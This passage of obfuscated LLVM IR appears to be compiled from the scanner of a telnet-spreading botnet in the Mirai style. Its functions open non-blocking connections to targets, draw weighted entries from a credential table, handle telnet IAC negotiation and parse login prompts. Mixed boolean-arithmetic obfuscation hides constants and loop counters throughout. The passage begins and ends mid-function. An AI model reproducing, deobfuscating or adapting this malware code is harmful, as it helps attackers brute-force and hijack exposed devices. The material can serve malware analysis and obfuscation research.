  %360 = or i32 1502783401, %350
  %361 = and i32 %359, %360
  %362 = or i32 %357, %361
  %363 = or i32 1935802368, %347
  %364 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 3
  %365 = load i8, i8* %364, align 1
  %366 = zext i8 %365 to i32
  %367 = shl i32 %366, 0
  %368 = xor i32 %362, -1
  %369 = xor i32 %367, -1
  %370 = xor i32 1444134197, -1
  %371 = and i32 %368, 1444134197
  %372 = and i32 %362, %370
  %373 = and i32 %369, 1444134197
  %374 = and i32 %367, %370
  %375 = or i32 %371, %372
  %376 = or i32 %373, %374
  %377 = xor i32 %375, %376
  %378 = or i32 %368, %369
  %379 = xor i32 %378, -1
  %380 = or i32 1444134197, %370
  %381 = and i32 %379, %380
  %382 = or i32 %377, %381
  %383 = or i32 %362, %367
  %384 = call i32 @htonl(i32 %382) #9
  store i32 %384, i32* %1, align 4
  br label %487

; <label>:385:                                    ; preds = %340
  %386 = load i32, i32* %3, align 4
  %387 = icmp eq i32 %386, 12
  br i1 %387, label %391, label %388

; <label>:388:                                    ; preds = %385
  %389 = load i32, i32* %3, align 4
  %390 = icmp eq i32 %389, 13
  br i1 %390, label %391, label %409

; <label>:391:                                    ; preds = %388, %385
  %392 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 2
  %393 = load i8, i8* %392, align 1
  %394 = zext i8 %393 to i32
  %395 = shl i32 %394, 8
  %396 = and i32 -875298816, %395
  %397 = xor i32 -875298816, %395
  %398 = or i32 %396, %397
  %399 = or i32 -875298816, %395
  %400 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 3
  %401 = load i8, i8* %400, align 1
  %402 = zext i8 %401 to i32
  %403 = shl i32 %402, 0
  %404 = and i32 %398, %403
  %405 = xor i32 %398, %403
  %406 = or i32 %404, %405
  %407 = or i32 %398, %403
  %408 = call i32 @htonl(i32 %406) #9
  store i32 %408, i32* %1, align 4
  br label %487

; <label>:409:                                    ; preds = %388
  %410 = load i32, i32* %3, align 4
  %411 = icmp eq i32 %410, 8
  br i1 %411, label %415, label %412

; <label>:412:                                    ; preds = %409
  %413 = load i32, i32* %3, align 4
  %414 = icmp eq i32 %413, 9
  br i1 %414, label %415, label %457

; <label>:415:                                    ; preds = %412, %409
  %416 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 2
  %417 = load i8, i8* %416, align 1
  %418 = zext i8 %417 to i32
  %419 = shl i32 %418, 8
  %420 = xor i32 453443584, -1
  %421 = xor i32 %419, -1
  %422 = xor i32 210827328, -1
  %423 = and i32 %420, 210827328
  %424 = and i32 453443584, %422
  %425 = and i32 %421, 210827328
  %426 = and i32 %419, %422
  %427 = or i32 %423, %424
  %428 = or i32 %425, %426
  %429 = xor i32 %427, %428
  %430 = or i32 %420, %421
  %431 = xor i32 %430, -1
  %432 = or i32 210827328, %422
  %433 = and i32 %431, %432
  %434 = or i32 %429, %433
  %435 = or i32 453443584, %419
  %436 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 3
  %437 = load i8, i8* %436, align 1
  %438 = zext i8 %437 to i32
  %439 = shl i32 %438, 0
  %440 = xor i32 %434, -1
  %441 = xor i32 %439, -1
  %442 = xor i32 762217399, -1
  %443 = and i32 %440, 762217399
  %444 = and i32 %434, %442
  %445 = and i32 %441, 762217399
  %446 = and i32 %439, %442
  %447 = or i32 %443, %444
  %448 = or i32 %445, %446
  %449 = xor i32 %447, %448
  %450 = or i32 %440, %441
  %451 = xor i32 %450, -1
  %452 = or i32 762217399, %442
  %453 = and i32 %451, %452
  %454 = or i32 %449, %453
  %455 = or i32 %434, %439
  %456 = call i32 @htonl(i32 %454) #9
  store i32 %456, i32* %1, align 4
  br label %487

; <label>:457:                                    ; preds = %412
  %458 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 0
  %459 = load i8, i8* %458, align 1
  %460 = zext i8 %459 to i32
  %461 = shl i32 %460, 24
  %462 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 1
  %463 = load i8, i8* %462, align 1
  %464 = zext i8 %463 to i32
  %465 = shl i32 %464, 16
  %466 = and i32 %461, %465
  %467 = xor i32 %461, %465
  %468 = or i32 %466, %467
  %469 = or i32 %461, %465
  %470 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 2
  %471 = load i8, i8* %470, align 1
  %472 = zext i8 %471 to i32
  %473 = shl i32 %472, 8
  %474 = and i32 %468, %473
  %475 = xor i32 %468, %473
  %476 = or i32 %474, %475
  %477 = or i32 %468, %473
  %478 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 3
  %479 = load i8, i8* %478, align 1
  %480 = zext i8 %479 to i32
  %481 = shl i32 %480, 0
  %482 = and i32 %476, %481
  %483 = xor i32 %476, %481
  %484 = or i32 %482, %483
  %485 = or i32 %476, %481
  %486 = call i32 @htonl(i32 %484) #9
  store i32 %486, i32* %1, align 4
  br label %487

; <label>:487:                                    ; preds = %457, %415, %391, %343, %295, %239, %198, %157, %124, %91, %38
  %488 = load i32, i32* %1, align 4
  ret i32 %488
}

declare zeroext i16 @checksum_generic(i16*, i32) #2

declare zeroext i16 @checksum_tcpudp(%struct.iphdr*, i8*, i16 zeroext, i32) #2

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #2

declare i64 @recvfrom(i32, i8*, i64, i32, %struct.sockaddr*, i32*) #2

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #5

; Function Attrs: noinline nounwind uwtable
define internal void @setup_connection(%struct.scanner_connection*) #0 {
  %2 = alloca %struct.scanner_connection*, align 8
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca %union.__SOCKADDR_ARG, align 8
  store %struct.scanner_connection* %0, %struct.scanner_connection** %2, align 8
  %5 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %5, i8 0, i64 16, i32 4, i1 false)
  %6 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %7 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %6, i32 0, i32 2
  %8 = load i32, i32* %7, align 8
  %9 = icmp ne i32 %8, -1
  br i1 %9, label %10, label %17

; <label>:10:                                     ; preds = %1
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 2
  %13 = load i32, i32* %12, align 8
  %14 = call i32 @close(i32 %13)
  %15 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %16 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %15, i32 0, i32 2
  store i32 -1, i32* %16, align 8
  br label %17

; <label>:17:                                     ; preds = %10, %1
  %18 = call i32 @socket(i32 2, i32 1, i32 0) #7
  %19 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %20 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %19, i32 0, i32 2
  store i32 %18, i32* %20, align 8
  %21 = icmp eq i32 %18, -1
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %17
  br label %86

; <label>:23:                                     ; preds = %17
  %24 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %25 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %24, i32 0, i32 1
  %26 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %25, i32 0, i32 1
  %27 = load i32, i32* %26, align 4
  %28 = icmp ugt i32 %27, -1
  br i1 %28, label %29, label %33

; <label>:29:                                     ; preds = %23
  %30 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %31 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %30, i32 0, i32 1
  %32 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %31, i32 0, i32 1
  store i32 -1, i32* %32, align 4
  br label %33

; <label>:33:                                     ; preds = %29, %23
  %34 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %35 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %34, i32 0, i32 4
  store i32 0, i32* %35, align 8
  %36 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %37 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %36, i32 0, i32 7
  %38 = getelementptr inbounds [8192 x i8], [8192 x i8]* %37, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %38, i8 0, i64 8192, i32 4, i1 false)
  %39 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %40 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %39, i32 0, i32 2
  %41 = load i32, i32* %40, align 8
  %42 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %43 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %42, i32 0, i32 2
  %44 = load i32, i32* %43, align 8
  %45 = call i32 (i32, i32, ...) @fcntl(i32 %44, i32 3, i32 0)
  %46 = xor i32 2048, -1
  %47 = xor i32 %45, -1
  %48 = xor i32 -1788268049, -1
  %49 = and i32 %46, -1788268049
  %50 = and i32 2048, %48
  %51 = and i32 %47, -1788268049
  %52 = and i32 %45, %48
  %53 = or i32 %49, %50
  %54 = or i32 %51, %52
  %55 = xor i32 %53, %54
  %56 = or i32 %46, %47
  %57 = xor i32 %56, -1
  %58 = or i32 -1788268049, %48
  %59 = and i32 %57, %58
  %60 = or i32 %55, %59
  %61 = or i32 2048, %45
  %62 = call i32 (i32, i32, ...) @fcntl(i32 %41, i32 4, i32 %60)
  %63 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %63, align 4
  %64 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %65 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %64, i32 0, i32 15
  %66 = load i32, i32* %65, align 4
  %67 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %68 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %67, i32 0, i32 0
  store i32 %66, i32* %68, align 4
  %69 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %70 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %69, i32 0, i32 13
  %71 = load i16, i16* %70, align 8
  %72 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %71, i16* %72, align 2
  %73 = load i32, i32* @fake_time, align 4
  %74 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %75 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %74, i32 0, i32 3
  store i32 %73, i32* %75, align 4
  %76 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %77 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %76, i32 0, i32 16
  store i32 1, i32* %77, align 8
  %78 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %79 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %78, i32 0, i32 2
  %80 = load i32, i32* %79, align 8
  %81 = bitcast %union.__SOCKADDR_ARG* %4 to %struct.sockaddr**
  %82 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  store %struct.sockaddr* %82, %struct.sockaddr** %81, align 8
  %83 = getelementptr inbounds %union.__SOCKADDR_ARG, %union.__SOCKADDR_ARG* %4, i32 0, i32 0
  %84 = load %struct.sockaddr*, %struct.sockaddr** %83, align 8
  %85 = call i32 @connect(i32 %80, %struct.sockaddr* %84, i32 16)
  br label %86

; <label>:86:                                     ; preds = %33, %22
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @fdclose(%struct.scanner_connection*, i32) #0 {
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %6 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %5, i32 0, i32 8
  %7 = getelementptr inbounds [16 x i8], [16 x i8]* %6, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %7, i8 0, i64 16, i32 4, i1 false)
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 1
  %10 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %9, i32 0, i32 0
  store i32 0, i32* %10, align 8
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 12
  store i8 0, i8* %12, align 1
  %13 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %14 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %13, i32 0, i32 9
  store i8 0, i8* %14, align 4
  %15 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %16 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %15, i32 0, i32 1
  %17 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %16, i32 0, i32 1
  store i32 -1, i32* %17, align 4
  %18 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %19 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i32 0, i32 5
  store i32 0, i32* %19, align 4
  %20 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %21 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %20, i32 0, i32 6
  store i32 0, i32* %21, align 8
  %22 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %23 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %22, i32 0, i32 2
  %24 = load i32, i32* %23, align 8
  %25 = icmp ne i32 %24, -1
  br i1 %25, label %26, label %31

; <label>:26:                                     ; preds = %2
  %27 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %28 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %27, i32 0, i32 2
  %29 = load i32, i32* %28, align 8
  %30 = call i32 @close(i32 %29)
  br label %31

; <label>:31:                                     ; preds = %26, %2
  %32 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %33 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %32, i32 0, i32 2
  store i32 -1, i32* %33, align 8
  %34 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %35 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %34, i32 0, i32 16
  store i32 0, i32* %35, align 8
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal %struct.scanner_auth* @random_auth_entry() #0 {
  %1 = alloca %struct.scanner_auth*, align 8
  %2 = alloca i32, align 4
  %3 = alloca i16, align 2
  %4 = call i32 @rand_next()
  %5 = load i16, i16* @auth_table_max_weight, align 2
  %6 = zext i16 %5 to i32
  %7 = urem i32 %4, %6
  %8 = trunc i32 %7 to i16
  store i16 %8, i16* %3, align 2
  store i32 0, i32* %2, align 4
  br label %9

; <label>:9:                                      ; preds = %43, %0
  %10 = load i32, i32* %2, align 4
  %11 = load i32, i32* @auth_table_len, align 4
  %12 = icmp slt i32 %10, %11
  br i1 %12, label %13, label %49

; <label>:13:                                     ; preds = %9
  %14 = load i16, i16* %3, align 2
  %15 = zext i16 %14 to i32
  %16 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %17 = load i32, i32* %2, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %16, i64 %18
  %20 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %19, i32 0, i32 2
  %21 = load i16, i16* %20, align 8
  %22 = zext i16 %21 to i32
  %23 = icmp slt i32 %15, %22
  br i1 %23, label %24, label %25

; <label>:24:                                     ; preds = %13
  br label %43

; <label>:25:                                     ; preds = %13
  %26 = load i16, i16* %3, align 2
  %27 = zext i16 %26 to i32
  %28 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %29 = load i32, i32* %2, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %28, i64 %30
  %32 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %31, i32 0, i32 3
  %33 = load i16, i16* %32, align 2
  %34 = zext i16 %33 to i32
  %35 = icmp slt i32 %27, %34
  br i1 %35, label %36, label %41

; <label>:36:                                     ; preds = %25
  %37 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %38 = load i32, i32* %2, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %37, i64 %39
  store %struct.scanner_auth* %40, %struct.scanner_auth** %1, align 8
  br label %50

; <label>:41:                                     ; preds = %25
  br label %42

; <label>:42:                                     ; preds = %41
  br label %43

; <label>:43:                                     ; preds = %42, %24
  %44 = load i32, i32* %2, align 4
  %45 = sub i32 %44, 429984682
  %46 = add i32 %45, 1
  %47 = add i32 %46, 429984682
  %48 = add nsw i32 %44, 1
  store i32 %47, i32* %2, align 4
  br label %9

; <label>:49:                                     ; preds = %9
  store %struct.scanner_auth* null, %struct.scanner_auth** %1, align 8
  br label %50

; <label>:50:                                     ; preds = %49, %36
  %51 = load %struct.scanner_auth*, %struct.scanner_auth** %1, align 8
  ret %struct.scanner_auth* %51
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #3

; Function Attrs: noinline nounwind uwtable
define i32 @recv_strip_null(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  %11 = load i32, i32* %5, align 4
  %12 = load i8*, i8** %6, align 8
  %13 = load i32, i32* %7, align 4
  %14 = sext i32 %13 to i64
  %15 = load i32, i32* %8, align 4
  %16 = call i64 @recv(i32 %11, i8* %12, i64 %14, i32 %15)
  %17 = trunc i64 %16 to i32
  store i32 %17, i32* %9, align 4
  %18 = load i32, i32* %9, align 4
  %19 = icmp sgt i32 %18, 0
  br i1 %19, label %20, label %46

; <label>:20:                                     ; preds = %4
  store i32 0, i32* %10, align 4
  store i32 0, i32* %10, align 4
  br label %21

; <label>:21:                                     ; preds = %39, %20
  %22 = load i32, i32* %10, align 4
  %23 = load i32, i32* %9, align 4
  %24 = icmp slt i32 %22, %23
  br i1 %24, label %25, label %45

; <label>:25:                                     ; preds = %21
  %26 = load i8*, i8** %6, align 8
  %27 = load i32, i32* %10, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds i8, i8* %26, i64 %28
  %30 = load i8, i8* %29, align 1
  %31 = sext i8 %30 to i32
  %32 = icmp eq i32 %31, 0
  br i1 %32, label %33, label %38

; <label>:33:                                     ; preds = %25
  %34 = load i8*, i8** %6, align 8
  %35 = load i32, i32* %10, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds i8, i8* %34, i64 %36
  store i8 65, i8* %37, align 1
  br label %38

; <label>:38:                                     ; preds = %33, %25
  br label %39

; <label>:39:                                     ; preds = %38
  %40 = load i32, i32* %10, align 4
  %41 = sub i32 %40, 1836866023
  %42 = add i32 %41, 1
  %43 = add i32 %42, 1836866023
  %44 = add nsw i32 %40, 1
  store i32 %43, i32* %10, align 4
  br label %21

; <label>:45:                                     ; preds = %21
  br label %46

; <label>:46:                                     ; preds = %45, %4
  %47 = load i32, i32* %9, align 4
  ret i32 %47
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_iacs(%struct.scanner_connection*) #0 {
  %2 = alloca %struct.scanner_connection*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca [3 x i8], align 1
  %7 = alloca [9 x i8], align 1
  store %struct.scanner_connection* %0, %struct.scanner_connection** %2, align 8
  store i32 0, i32* %3, align 4
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 7
  %10 = getelementptr inbounds [8192 x i8], [8192 x i8]* %9, i32 0, i32 0
  store i8* %10, i8** %4, align 8
  br label %11

; <label>:11:                                     ; preds = %145, %40, %1
  %12 = load i32, i32* %3, align 4
  %13 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %14 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %13, i32 0, i32 4
  %15 = load i32, i32* %14, align 8
  %16 = icmp slt i32 %12, %15
  br i1 %16, label %17, label %146

; <label>:17:                                     ; preds = %11
  %18 = load i8*, i8** %4, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp ne i32 %20, 255
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %17
  br label %146

; <label>:23:                                     ; preds = %17
  %24 = load i8*, i8** %4, align 8
  %25 = load i8, i8* %24, align 1
  %26 = zext i8 %25 to i32
  %27 = icmp eq i32 %26, 255
  br i1 %27, label %28, label %144

; <label>:28:                                     ; preds = %23
  %29 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %30 = load i8*, i8** %4, align 8
  %31 = call signext i8 @can_consume(%struct.scanner_connection* %29, i8* %30, i32 1)
  %32 = icmp ne i8 %31, 0
  br i1 %32, label %34, label %33

; <label>:33:                                     ; preds = %28
  br label %146

; <label>:34:                                     ; preds = %28
  %35 = load i8*, i8** %4, align 8
  %36 = getelementptr inbounds i8, i8* %35, i64 1
  %37 = load i8, i8* %36, align 1
  %38 = zext i8 %37 to i32
  %39 = icmp eq i32 %38, 255
  br i1 %39, label %40, label %48

; <label>:40:                                     ; preds = %34
  %41 = load i8*, i8** %4, align 8
  %42 = getelementptr inbounds i8, i8* %41, i64 2
  store i8* %42, i8** %4, align 8
  %43 = load i32, i32* %3, align 4
  %44 = sub i32 %43, -68395628
  %45 = add i32 %44, 2
  %46 = add i32 %45, -68395628
  %47 = add nsw i32 %43, 2
  store i32 %46, i32* %3, align 4
  br label %11

; <label>:48:                                     ; preds = %34
  %49 = load i8*, i8** %4, align 8
  %50 = getelementptr inbounds i8, i8* %49, i64 1
  %51 = load i8, i8* %50, align 1
  %52 = zext i8 %51 to i32
  %53 = icmp eq i32 %52, 253
  br i1 %53, label %54, label %86

; <label>:54:                                     ; preds = %48
  %55 = bitcast [3 x i8]* %6 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %55, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @consume_iacs.tmp1, i32 0, i32 0), i64 3, i32 1, i1 false)
  %56 = bitcast [9 x i8]* %7 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %56, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @consume_iacs.tmp2, i32 0, i32 0), i64 9, i32 1, i1 false)
  %57 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %58 = load i8*, i8** %4, align 8
  %59 = call signext i8 @can_consume(%struct.scanner_connection* %57, i8* %58, i32 2)
  %60 = icmp ne i8 %59, 0
  br i1 %60, label %62, label %61

; <label>:61:                                     ; preds = %54
  br label %146

; <label>:62:                                     ; preds = %54
  %63 = load i8*, i8** %4, align 8
  %64 = getelementptr inbounds i8, i8* %63, i64 2
  %65 = load i8, i8* %64, align 1
  %66 = zext i8 %65 to i32
  %67 = icmp ne i32 %66, 31
  br i1 %67, label %68, label %69

; <label>:68:                                     ; preds = %62
  br label %87

; <label>:69:                                     ; preds = %62
  %70 = load i8*, i8** %4, align 8
  %71 = getelementptr inbounds i8, i8* %70, i64 3
  store i8* %71, i8** %4, align 8
  %72 = load i32, i32* %3, align 4
  %73 = sub i32 0, 3
  %74 = sub i32 %72, %73
  %75 = add nsw i32 %72, 3
  store i32 %74, i32* %3, align 4
  %76 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %77 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %76, i32 0, i32 2
  %78 = load i32, i32* %77, align 8
  %79 = getelementptr inbounds [3 x i8], [3 x i8]* %6, i32 0, i32 0
  %80 = call i64 @send(i32 %78, i8* %79, i64 3, i32 16384)
  %81 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %82 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %81, i32 0, i32 2
  %83 = load i32, i32* %82, align 8
  %84 = getelementptr inbounds [9 x i8], [9 x i8]* %7, i32 0, i32 0
  %85 = call i64 @send(i32 %83, i8* %84, i64 9, i32 16384)
  br label %142

; <label>:86:                                     ; preds = %48
  br label %87

; <label>:87:                                     ; preds = %86, %68
  %88 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %89 = load i8*, i8** %4, align 8
  %90 = call signext i8 @can_consume(%struct.scanner_connection* %88, i8* %89, i32 2)
  %91 = icmp ne i8 %90, 0
  br i1 %91, label %93, label %92

; <label>:92:                                     ; preds = %87
  br label %146

; <label>:93:                                     ; preds = %87
  store i32 0, i32* %5, align 4
  br label %94

; <label>:94:                                     ; preds = %125, %93
  %95 = load i32, i32* %5, align 4
  %96 = icmp slt i32 %95, 3
  br i1 %96, label %97, label %130

; <label>:97:                                     ; preds = %94
  %98 = load i8*, i8** %4, align 8
  %99 = load i32, i32* %5, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds i8, i8* %98, i64 %100
  %102 = load i8, i8* %101, align 1
  %103 = zext i8 %102 to i32
  %104 = icmp eq i32 %103, 253
  br i1 %104, label %105, label %110

; <label>:105:                                    ; preds = %97
  %106 = load i8*, i8** %4, align 8
  %107 = load i32, i32* %5, align 4
  %108 = sext i32 %107 to i64
  %109 = getelementptr inbounds i8, i8* %106, i64 %108
  store i8 -4, i8* %109, align 1
  br label %124

; <label>:110:                                    ; preds = %97
  %111 = load i8*, i8** %4, align 8
  %112 = load i32, i32* %5, align 4
  %113 = sext i32 %112 to i64
  %114 = getelementptr inbounds i8, i8* %111, i64 %113
  %115 = load i8, i8* %114, align 1
  %116 = zext i8 %115 to i32
  %117 = icmp eq i32 %116, 251
  br i1 %117, label %118, label %123

; <label>:118:                                    ; preds = %110
  %119 = load i8*, i8** %4, align 8
  %120 = load i32, i32* %5, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds i8, i8* %119, i64 %121
  store i8 -3, i8* %122, align 1
  br label %123

; <label>:123:                                    ; preds = %118, %110
  br label %124

; <label>:124:                                    ; preds = %123, %105
  br label %125

; <label>:125:                                    ; preds = %124
  %126 = load i32, i32* %5, align 4
  %127 = sub i32 0, 1
  %128 = sub i32 %126, %127
  %129 = add nsw i32 %126, 1
  store i32 %128, i32* %5, align 4
  br label %94

; <label>:130:                                    ; preds = %94
  %131 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %132 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %131, i32 0, i32 2
  %133 = load i32, i32* %132, align 8
  %134 = load i8*, i8** %4, align 8
  %135 = call i64 @send(i32 %133, i8* %134, i64 3, i32 16384)
  %136 = load i8*, i8** %4, align 8
  %137 = getelementptr inbounds i8, i8* %136, i64 3
  store i8* %137, i8** %4, align 8
  %138 = load i32, i32* %3, align 4
  %139 = sub i32 0, 3
  %140 = sub i32 %138, %139
  %141 = add nsw i32 %138, 3
  store i32 %140, i32* %3, align 4
  br label %142

; <label>:142:                                    ; preds = %130, %69
  br label %143

; <label>:143:                                    ; preds = %142
  br label %144

; <label>:144:                                    ; preds = %143, %23
  br label %145

; <label>:145:                                    ; preds = %144
  br label %11

; <label>:146:                                    ; preds = %92, %61, %33, %22, %11
  %147 = load i32, i32* %3, align 4
  ret i32 %147
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_login_prompt(%struct.scanner_connection*, i32) #0 {
  %3 = alloca i32, align 4
  %4 = alloca %struct.scanner_connection*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 -1, i32* %8, align 4
  %9 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %10 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %9, i32 0, i32 4
  %11 = load i32, i32* %10, align 8
  %12 = add i32 %11, -1259622499
  %13 = sub i32 %12, 1
  %14 = sub i32 %13, -1259622499
  %15 = sub nsw i32 %11, 1
  store i32 %14, i32* %6, align 4
  br label %16

; <label>:16:                                     ; preds = %74, %2
  %17 = load i32, i32* %6, align 4
  %18 = icmp sgt i32 %17, 0
  br i1 %18, label %19, label %80

; <label>:19:                                     ; preds = %16
  %20 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %21 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %20, i32 0, i32 7
  %22 = load i32, i32* %6, align 4
  %23 = sext i32 %22 to i64
  %24 = getelementptr inbounds [8192 x i8], [8192 x i8]* %21, i64 0, i64 %23
  %25 = load i8, i8* %24, align 1
  %26 = sext i8 %25 to i32
  %27 = icmp eq i32 %26, 58
  br i1 %27, label %67, label %28

; <label>:28:                                     ; preds = %19
